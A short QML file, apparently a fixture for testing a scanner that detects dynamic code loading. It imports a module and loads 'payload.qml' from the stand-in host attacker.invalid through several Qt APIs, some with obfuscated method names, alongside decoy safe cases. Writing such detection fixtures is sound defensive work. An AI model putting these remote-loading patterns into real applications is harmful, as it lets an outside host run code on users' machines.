import QtQuick
import "https://attacker.invalid/module"

Item {
    property var q: Qt
    property string dynamicUrl: "https://attacker.invalid/payload.qml"
    property string harmlessDocumentation: "Qt.createComponent loader.setSource import(x)"
    property Component safeStaticComponent: Component { Item {} }

    Loader { sourceComponent: safeStaticComponent }
    Loader { source: dynamicUrl }

    function construct(payload, loader) {
        Qt.createComponent(dynamicUrl)
        Qt.createQmlObject(payload, loader)
        loader.setSource(dynamicUrl)
        Qt.include(dynamicUrl)
        q["create" + "Component"](dynamicUrl)
        Qt[payload](dynamicUrl)
        import(dynamicUrl)
    }
}
